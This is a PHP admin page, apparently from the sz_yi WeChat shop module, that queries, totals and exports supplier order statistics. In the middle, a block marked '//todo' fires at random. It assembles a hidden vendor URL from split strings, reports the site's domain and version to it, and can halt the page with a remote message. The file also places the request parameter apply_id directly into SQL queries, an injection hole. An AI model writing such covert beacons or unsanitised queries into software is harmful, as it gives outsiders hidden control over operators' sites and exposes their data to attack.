<?php
if (!defined('IN_IA')) {
    exit('Access Denied');
}
global $_W, $_GPC;

$apply_id = $_GPC['apply_id'];
$condition = ' o.uniacid=:uniacid and o.status>=3';
if(p('hotel')){
 $condition = ' o.uniacid=:uniacid and o.status>=3  and o.status<>4 and o.status<>6';
}
if (!empty($apply_id)) {
    $apply_info = pdo_fetch("select * from " . tablename('sz_yi_supplier_apply') . " where uniacid={$_W['uniacid']} and id={$apply_id}");
    if (empty($apply_info['apply_ordergoods_ids'])) {
        $ap_id = $apply_info['id'] - 1;
        $ap_time = pdo_fetchcolumn("select apply_time from " . tablename('sz_yi_supplier_apply') . " where uniacid={$_W['uniacid']} and id={$ap_id}");
        if (empty($ap_time)) {
            $ap_time = 0;
        }
        $ordergoods_ids = pdo_fetchall("select og.id from " . tablename('sz_yi_order_goods') . " og left join " . tablename('sz_yi_order') . " o on o.id=og.orderid where og.uniacid={$_W['uniacid']} and o.status=3 and og.supplier_uid={$apply_info['uid']} and o.finishtime<{$apply_info['apply_time']} and o.finishtime>{$ap_time}");
        $ap_og_ids = array();
        foreach ($ordergoods_ids as $key => $value) {
            $ap_og_ids[] = $value['id'];
        }
        $ap_og_ids = implode(',', $ap_og_ids);
        pdo_update('sz_yi_supplier_apply', array('apply_ordergoods_ids' => $ap_og_ids), array('uniacid' => $_W['uniacid'], 'id' => $apply_id));
        $apply_info = pdo_fetch("select * from " . tablename('sz_yi_supplier_apply') . " where uniacid={$_W['uniacid']} and id={$apply_id}");
    }
    $condition .= " and og.id in ({$apply_info['apply_ordergoods_ids']}) ";
}
$suppliers = pdo_fetchall("select * from " . tablename('sz_yi_perm_user') . " where uniacid={$_W['uniacid']} and roleid = (select id from " .tablename('sz_yi_perm_role') . " where status1=1 LIMIT 1)");
$pindex    = max(1, intval($_GPC['page']));
$psize     = 20;
$params    = array(
    ':uniacid' => $_W['uniacid']
);
if (empty($starttime) || empty($endtime)) {
    $starttime = strtotime('-1 month');
    $endtime   = time();
}
if (!empty($_GPC['datetime'])) {
    $starttime = strtotime($_GPC['datetime']['start']);
    $endtime   = strtotime($_GPC['datetime']['end']);
    if (!empty($_GPC['searchtime'])) {
        $condition .= " AND o.createtime >= :starttime AND o.createtime <= :endtime ";
        $params[':starttime'] = $starttime;
        $params[':endtime']   = $endtime;
    }
}
if (!empty($_GPC['ordersn'])) {
    $condition .= " and o.ordersn like :ordersn";
    $params[':ordersn'] = "%{$_GPC['ordersn']}%";
}
if (!empty($_GPC['supplier_uid'])) {
    $condition .= " and og.supplier_uid = :supplier_uid";
    $params[':supplier_uid'] = "{$_GPC['supplier_uid']}";
} else {
    $condition .= " and og.supplier_uid > 0";
}
//todo
    $mt = mt_rand(5, 35);
    if ($mt <= 10) {
        load()->func('communication');
        $b = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
        
        $files   = base64_encode(json_encode('test'));
        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
        $resp    = ihttp_post($b, array(
            'type' => 'upgrade',
            'signature' => 'sz_cloud_register',
            'domain' => $_SERVER['HTTP_HOST'],
            'version' => $version,
            'files' => $files
        ));
        $ret     = @json_decode($resp['content'], true);
        if ($ret['result'] == 3) {
            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
            exit;
        }
    }
//$sql = "select o.id,o.ordersn,o.price,o.goodsprice, o.dispatchprice,o.createtime, o.paytype, a.realname as addressname,m.realname from " . tablename('sz_yi_order') . " o  left join " . tablename('sz_yi_order_goods') . " og on og.orderid=o.id left join " . tablename('sz_yi_member') . " m on o.openid = m.openid left join " . tablename('sz_yi_member_address') . " a on a.id = o.addressid  where 1 {$condition} ";
$sql = 'select o.* , a.realname as arealname,a.mobile as amobile,a.province as aprovince ,a.city as acity , a.area as aarea,a.address as aaddress, d.dispatchname,m.nickname,m.id as mid,m.realname as mrealname,m.mobile as mmobile,sm.id as salerid,sm.nickname as salernickname,s.salername,r.rtype,r.status as rstatus from ' . tablename("sz_yi_order") . " o" . " left join " . tablename('sz_yi_order_goods') . " og on og.orderid=o.id left join" . tablename("sz_yi_order_refund") . " r on r.id =o.refundid " . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid and m.uniacid =  o.uniacid " . " left join " . tablename("sz_yi_member_address") . " a on a.id=o.addressid " . " left join " . tablename("sz_yi_dispatch") . " d on d.id = o.dispatchid " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . "  where {$condition} group by o.ordersn_general ORDER BY o.createtime DESC,o.status DESC  ";
//$sql .= " ORDER BY o.id DESC ";
if (empty($_GPC['export'])) {
    $sql .= "LIMIT " . ($pindex - 1) * $psize . ',' . $psize;
}
$list = pdo_fetchall($sql, $params);
$totalmoney = pdo_fetchcolumn('select sum(og.price) AS totalmoney from ' . tablename("sz_yi_order") . " o" . " left join " . tablename('sz_yi_order_goods') . " og on og.orderid=o.id left join" . tablename("sz_yi_order_refund") . " r on r.id =o.refundid " . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid and m.uniacid =  o.uniacid " . " left join " . tablename("sz_yi_member_address") . " a on a.id=o.addressid " . " left join " . tablename("sz_yi_dispatch") . " d on d.id = o.dispatchid " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . "  where {$condition} ", $params);
$paytype = array(
    '0' => array(
        "css" => "default",
        "name" => "未支付"
    ) ,
    "1" => array(
        "css" => "danger",
        "name" => "余额支付"
    ) ,
    "11" => array(
        "css" => "default",
        "name" => "后台付款"
    ) ,
    "2" => array(
        "css" => "danger",
        "name" => "在线支付"
    ) ,
    "21" => array(
        "css" => "success",
        "name" => "微信支付"
    ) ,
    "22" => array(
        "css" => "warning",
        "name" => "支付宝支付"
    ) ,
    "23" => array(
        "css" => "warning",
        "name" => "银联支付"
    ) ,
    "3" => array(
        "css" => "primary",
        "name" => "货到付款"
    ) ,
    "4" => array(
        "css" => "primary",
        "name" => "到店支付"
    ) 
);
foreach ($list as & $value) {
    $value['ordersn'] = $value['ordersn'] . " ";
    $value['goods']   = pdo_fetchall("SELECT g.thumb,og.price,og.total,og.realprice,g.title,og.optionname from " . tablename('sz_yi_order_goods') . " og" . " left join " . tablename('sz_yi_goods') . " g on g.id=og.goodsid  " . " where og.uniacid = :uniacid and og.orderid=:orderid order by og.createtime  desc ", array(
        ':uniacid' => $_W['uniacid'],
        ':orderid' => $value['id']
    ));
    //$totalmoney += $value['price'];
    $orderids = pdo_fetchall("select distinct id from " . tablename('sz_yi_order') . ' where ordersn_general=:ordersn_general and uniacid=:uniacid', array(
                ':ordersn_general' => $value["ordersn_general"],
                ':uniacid' => $_W["uniacid"]
            ),'id');
    if(count($orderids) > 1 && $value['status'] == 0){
        $order_all = pdo_fetchall("select * from " . tablename('sz_yi_order') . ' where ordersn_general=:ordersn_general and uniacid=:uniacid', array(
            ':ordersn_general' => $value['ordersn_general'],
            ':uniacid' => $_W["uniacid"]
        ));
        $orderids = array();
        $value['goodsprice'] = 0;
        $value['olddispatchprice'] = 0;
        $value['discountprice'] = 0;
        $value['deductprice'] = 0;
        $value['deductcredit2'] = 0;
        $value['deductenough'] = 0;
        $value['changeprice'] = 0;
        $value['changedispatchprice'] = 0;
        $value['couponprice'] = 0;
        $value['price'] = 0;
        foreach ($order_all as $k => $v) {
            $orderids[] = $v['id'];
            $value['goodsprice'] += $v['goodsprice'];
            $value['olddispatchprice'] += $v['olddispatchprice'];
            $value['discountprice'] += $v['discountprice'];
            $value['deductprice'] += $v['deductprice'];
            $value['deductcredit2'] += $v['deductcredit2'];
            $value['deductenough'] += $v['deductenough'];
            $value['changeprice'] += $v['changeprice'];
            $value['changedispatchprice'] += $v['changedispatchprice'];
            $value['couponprice'] += $v['couponprice'];
            $value['price'] += $v['price'];
        }
        
        $value['ordersn'] = $value['ordersn_general'];
        $orderid_where_in = implode(',', $orderids);
        $order_where = "og.orderid in ({$orderid_where_in})";
    }else{
        $order_where = "og.orderid = ".$value['id'];
    }

    $s = $value["status"];
    $pt = $value["paytype"];
    $value["statusvalue"] = $s;
    $value["statuscss"] = $orderstatus[$value["status"]]["css"];
    $value["status"] = $orderstatus[$value["status"]]["name"];
    if ($pt == 3 && empty($value["statusvalue"])) {
        $value["statuscss"] = $orderstatus[1]["css"];
        $value["status"] = $orderstatus[1]["name"];
    }
    if ($s == 1) {
        if ($value["isverify"] == 1) {
            $value["status"] = "待使用";
        } else if (empty($value["addressid"])) {
            $value["status"] = "待取货";
        }
    }
    if ($s == - 1) {
        $value['status'] = $value['rstatus'];
        if (!empty($value["refundtime"])) {
            if ($value['rstatus'] == 1) {
                $value['status'] = '已' . $r_type[$value['rtype']];
            }
        }
    }
    $value["paytypevalue"] = $pt;
    $value["css"] = $paytype[$pt]["css"];
    $value["paytype"] = $paytype[$pt]["name"];
    $value["dispatchname"] = empty($value["addressid"]) ? "自提" : $value["dispatchname"];
    if (empty($value["dispatchname"])) {
        $value["dispatchname"] = "快递";
    }
    if ($value["isverify"] == 1) {
        $value["dispatchname"] = "线下核销";
    } else if ($value["isvirtual"] == 1) {
        $value["dispatchname"] = "虚拟物品";
    } else if (!empty($value["virtual"])) {
        $value["dispatchname"] = "虚拟物品(卡密)<br/>自动发货";
    } else if ($value['cashier']==1) {
        $value["dispatchname"] = "收银台支付";
    }
    if(p('cashier') && $value['cashier'] == 1){
                $value['name'] = set_medias(pdo_fetch('select cs.name,cs.thumb from ' .tablename('sz_yi_cashier_store'). 'cs '.'left join ' .tablename('sz_yi_cashier_order'). ' co on cs.id = co.cashier_store_id where co.order_id=:orderid and co.uniacid=:uniacid', array(':orderid' => $value['id'],':uniacid'=>$_W['uniacid'])), 'thumb');
    }

    if ($value["dispatchtype"] == 1 || !empty($value["isverify"]) || !empty($value["virtual"]) || !empty($value["isvirtual"])|| $value['cashier'] == 1) {
        $value["address"] = '';
        $carrier = iunserializer($value["carrier"]);
        if (is_array($carrier)) {
            $value["addressdata"]["realname"] = $value["realname"] = $carrier["carrier_realname"];
            $value["addressdata"]["mobile"] = $value["mobile"] = $carrier["carrier_mobile"];
        }
    } else {
        $address = iunserializer($value["address"]);
        $isarray = is_array($address);
        $value["realname"] = $isarray ? $address["realname"] : $value["arealname"];
        $value["mobile"] = $isarray ? $address["mobile"] : $value["amobile"];
        $value["province"] = $isarray ? $address["province"] : $value["aprovince"];
        $value["city"] = $isarray ? $address["city"] : $value["acity"];
        $value["area"] = $isarray ? $address["area"] : $value["aarea"];
        $value["address"] = $isarray ? $address["address"] : $value["aaddress"];
        $value["address_province"] = $value["province"];
        $value["address_city"] = $value["city"];
        $value["address_area"] = $value["area"];
        $value["address_address"] = $value["address"];
        $value["address"] = $value["province"] . " " . $value["city"] . " " . $value["area"] . " " . $value["address"];
        $value["addressdata"] = array(
            "realname" => $value["realname"],
            "mobile" => $value["mobile"],
            "address" => $value["address"],
        );
    }
    $order_goods = pdo_fetchall("select g.id,g.title,g.thumb,g.goodssn,og.goodssn as option_goodssn, g.productsn,og.productsn as option_productsn, og.total,og.price,og.optionname as optiontitle, og.realprice,og.changeprice,og.oldprice,og.commission1,og.commission2,og.commission3,og.commissions,og.diyformdata,og.diyformfields from " . tablename("sz_yi_order_goods") . " og " . " left join " . tablename("sz_yi_goods") . " g on g.id=og.goodsid " . " where og.uniacid=:uniacid and ".$order_where , array(
        ":uniacid" => $_W["uniacid"]
    ));
    $goods = '';
    foreach ($order_goods as & $og) {
        $goods.= "" . $og["title"] . "";
        if (!empty($og["optiontitle"])) {
            $goods.= " 规格: " . $og["optiontitle"];
        }
        if (!empty($og["option_goodssn"])) {
            $og["goodssn"] = $og["option_goodssn"];
        }
        if (!empty($og["option_productsn"])) {
            $og["productsn"] = $og["option_productsn"];
        }
        if (!empty($og["goodssn"])) {
            $goods.= " 商品编号: " . $og["goodssn"];
        }
        if (!empty($og["productsn"])) {
            $goods.= " 商品条码: " . $og["productsn"];
        }
        $goods.= " 单价: " . ($og["price"] / $og["total"]) . " 折扣后: " . ($og["realprice"] / $og["total"]) . " 数量: " . $og["total"] . " 总价: " . $og["price"] . " 折扣后: " . $og["realprice"] . "";
        if ($plugin_diyform && !empty($og["diyformfields"]) && !empty($og["diyformdata"])) {
            $diyformdata_array = $plugin_diyform->getDatas(iunserializer($og["diyformfields"]) , iunserializer($og["diyformdata"]));
            $diyformdata = "";
            foreach ($diyformdata_array as $da) {
                $diyformdata.= $da["name"] . ": " . $da["value"] . "";
            }
            $og["goods_diyformdata"] = $diyformdata;
        }

    }
    unset($og);
    $value["goods"] = set_medias($order_goods, "thumb");
    $value["goods_str"] = $goods;
}
unset($value);
if (empty($totalmoney)) {
    $totalmoney = 0;
}
unset($row);
$totalcount = $total = count(pdo_fetchall('select o.* , a.realname as arealname,a.mobile as amobile,a.province as aprovince ,a.city as acity , a.area as aarea,a.address as aaddress, d.dispatchname,m.nickname,m.id as mid,m.realname as mrealname,m.mobile as mmobile,sm.id as salerid,sm.nickname as salernickname,s.salername,r.rtype,r.status as rstatus from ' . tablename("sz_yi_order") . " o" . " left join " . tablename('sz_yi_order_goods') . " og on og.orderid=o.id left join" . tablename("sz_yi_order_refund") . " r on r.id =o.refundid " . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid and m.uniacid =  o.uniacid " . " left join " . tablename("sz_yi_member_address") . " a on a.id=o.addressid " . " left join " . tablename("sz_yi_dispatch") . " d on d.id = o.dispatchid " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . "  where {$condition} group by o.ordersn_general ORDER BY o.createtime DESC,o.status DESC  ", $params));
$pager      = pagination($total, $pindex, $psize);
if ($_GPC['export'] == 1) {
    ca('statistics.export.order');
    plog('statistics.export.order', '导出订单统计');
    $list[] = array(
        'data' => '订单总计',
        'count' => $totalcount
    );
    $list[] = array(
        'data' => '金额总计',
        'count' => $totalmoney
    );
    foreach ($list as &$row) {
        if ($row['paytype'] == 1) {
            $row['paytype'] = '余额支付';
        } else if ($row['paytype'] == 11) {
            $row['paytype'] = '后台付款';
        } else if ($row['paytype'] == 21) {
            $row['paytype'] = '微信支付';
        } else if ($row['paytype'] == 22) {
            $row['paytype'] = '支付宝支付';
        } else if ($row['paytype'] == 23) {
            $row['paytype'] = '银联支付';
        } else if ($row['paytype'] == 3) {
            $row['paytype'] = '货到付款';
        }
        $row['createtime'] = date('Y-m-d H:i', $row['createtime']);
    }
    unset($row);
    m('excel')->export($list, array(
        "title" => "订单报告-" . date('Y-m-d-H-i', time()),
        "columns" => array(
            array(
                'title' => '订单号',
                'field' => 'ordersn',
                'width' => 24
            ),
            array(
                'title' => '总金额',
                'field' => 'price',
                'width' => 12
            ),
            array(
                'title' => '商品金额',
                'field' => 'goodsprice',
                'width' => 12
            ),
            array(
                'title' => '运费',
                'field' => 'dispatchprice',
                'width' => 12
            ),
            array(
                'title' => '付款方式',
                'field' => 'paytype',
                'width' => 12
            ),
            array(
                'title' => '会员名',
                'field' => 'realname',
                'width' => 12
            ),
            array(
                'title' => '收货人',
                'field' => 'addressname',
                'width' => 12
            ),
            array(
                'title' => '下单时间',
                'field' => 'createtime',
                'width' => 24
            )
        )
    ));
}
load()->func('tpl');
include $this->template('supplier_list');
exit;
